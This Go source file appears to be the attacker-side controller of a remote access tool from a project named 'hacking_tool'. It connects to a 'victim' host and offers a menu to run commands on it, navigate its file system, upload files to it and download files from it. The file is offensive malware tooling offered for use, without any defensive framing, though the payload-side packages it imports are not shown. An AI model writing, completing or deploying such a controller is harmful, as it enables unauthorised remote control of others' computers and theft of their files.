package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/didihart/hacking_tool/Hacker/download"
	"github.com/didihart/hacking_tool/Hacker/filenavigation"
	"github.com/didihart/hacking_tool/Hacker/handler"
	"github.com/didihart/hacking_tool/Hacker/upload"
	"github.com/didihart/hacking_tool/commands"
)

func options() {
	fmt.Println()
	fmt.Println("\t[ 1 ]  Execute Command")
	fmt.Println("\t[ 2 ]  Move in File system")
	fmt.Println("\t[ 3 ]  UploadFile")
	fmt.Println("\t[ 4 ]  Download")
	fmt.Println("\t[ 0 ]  Exit")
	fmt.Println()

}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	IP := ""
	Port := ""
	connection, err := handler.ConnectWithVictim(IP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Println("[+] Connection established with ", connection.RemoteAddr().String())

	reader := bufio.NewReader(os.Stdin)

	looper := true

	for looper {
		options()
		fmt.Printf("[+] Enter Options ")
		userInputRaw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		connection.Write([]byte(userInputRaw))

		userInput := strings.TrimSuffix(userInputRaw, "\n")

		switch {
		case userInput == "1":
			fmt.Println("[+] Command Execution program")
			err := commands.ExecuteCommandWindows(connection)
			DisplayError(err)

		case userInput == "2":
			fmt.Println("[+] Navigating File system on Victim")
			err = filenavigation.NavigateSystem(connection)
			DisplayError(err)

		case userInput == "3":
			fmt.Println("[+] Uploading File to the Victim")
			err = upload.UploadFileToVictim(connection)
			DisplayError(err)

		case userInput == "4":
			fmt.Println("[+] Downloading File from the victim ")
			err = download.DownloadFromVictimServer(connection)
			DisplayError(err)

		case userInput == "0":
			fmt.Println("[+] Exiting the program")
			looper = false
		default:
			fmt.Println("[-] Invalid option, try again a")
		}

	}

}
